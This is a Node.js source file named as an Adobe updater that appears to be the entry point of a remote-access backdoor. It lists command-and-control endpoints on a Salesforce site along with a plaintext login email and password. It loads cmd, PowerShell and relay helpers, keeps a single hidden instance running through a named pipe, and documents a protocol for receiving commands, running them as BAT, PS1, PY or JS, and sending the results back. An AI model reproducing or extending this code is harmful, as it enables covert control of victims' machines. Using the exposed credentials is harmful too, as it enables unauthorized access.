// 20260909-1013

debugger;

/*
    https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/adminui
    https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/ping.php
    https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/retrieve.php
    https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce.com/
    storagevault941@agentforce.com
    As1df1gh!
*/

const helper = require("./adobeupdate.helper.js");
const helper_web = require("./adobeupdate.helper.web.js");
const helper_config = require("./adobeupdate.helper.config.js");
const helper_ps = require("./adobeupdate.helper.ps.js");
const helper_cmd = require("./adobeupdate.helper.cmd.js");
const helper_relay = require("./adobeupdate.helper.relay.js");

const path = require("path");
const PubNub = require("pubnub");
const net = require("net");
const { fork, exec, spawn } = require("child_process");
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");
const util = require("util");

function ensureSingleInstancePipe(initfunc) {
    const PIPE_NAME = helper_cmd.runningcmd.lockfname;

    helper.logmsg(`obtaining lock  ${PIPE_NAME}`);

    const server = net.createServer();

    server.on("error", (err) => {
        if (err.code === "EADDRINUSE") {
            helper.logmsg(
                `Fatal Error: another instance is already running. -- exiting -- err.code: ${err.code}`
            );
            process.exit(1);
        }
    });

    server.listen(PIPE_NAME, async () => {
        server.unref();

        if (initfunc) {
            try {
                initfunc();
            } catch (err) {
                helper.logmsg(err);
            }
        }
    });
}

let cmdarrstr = helper_ps.getcmdarrstr();
let statestr = helper_config.systemconfig.statestr;

helper.logmsgt(`starting --  ${statestr} ${cmdarrstr}`);

ensureSingleInstancePipe(helper_cmd.runningcmd.cmdfunc);

/*
let clientjob = {
jobtype: 'EXEC_<ext>', 'execute_cmdlist', 'EXEC_CMD'
jobcode: 8 digit 0-9 random code,
localpath:'' local path of script text (n/a for EXEC_CMD)
jobfilename:'' --> need extension to execute script engine
cmdname: 'GetSystemOverview',
args: [ ... ]
};

ping.php
EXEC_CMD --> StartRelay|BAT,PS1,PY,JS

incomming cmd
{ cmdtext:'echo 1234 \n', seqid:1234, cmdid:random 8 digit code, ts:timestamp }

outgoing result
{ status:'OK', scriptengine:'BAT', execresult:data, seqid:1234+1, cmdid:random 8 digit code, ts:timestamp }
{ status:'ERROR', scriptengine:'BAT', execresult:data, seqid:1234+1, cmdid:random 8 digit code, ts:timestamp }
{ status:'INFO', scriptengine:'BAT', execresult:data, seqid:1234+1, cmdid:random 8 digit code, ts:timestamp }
*/

/*
    {
        cmdtext:cmdtext,
        seqid:seqid++,
        cmdid:getRandomCode(8),
        ts:getTimestamp()
    }

    { execresult: str, ts: getTimestamp() }

    Python Relay

    incomming messages

    host sends:
    {
        MessageID
        payload
        ws_url
        ts
    }

    client expects:
    {
      "MessageID":...
      "payload":{}
      "ws_url":
      "builtincmd":
    }

    outgoing
    {
      "MessageID"
      "payload" --> holds result object from executing incoming cmd
    }


*/

// ---
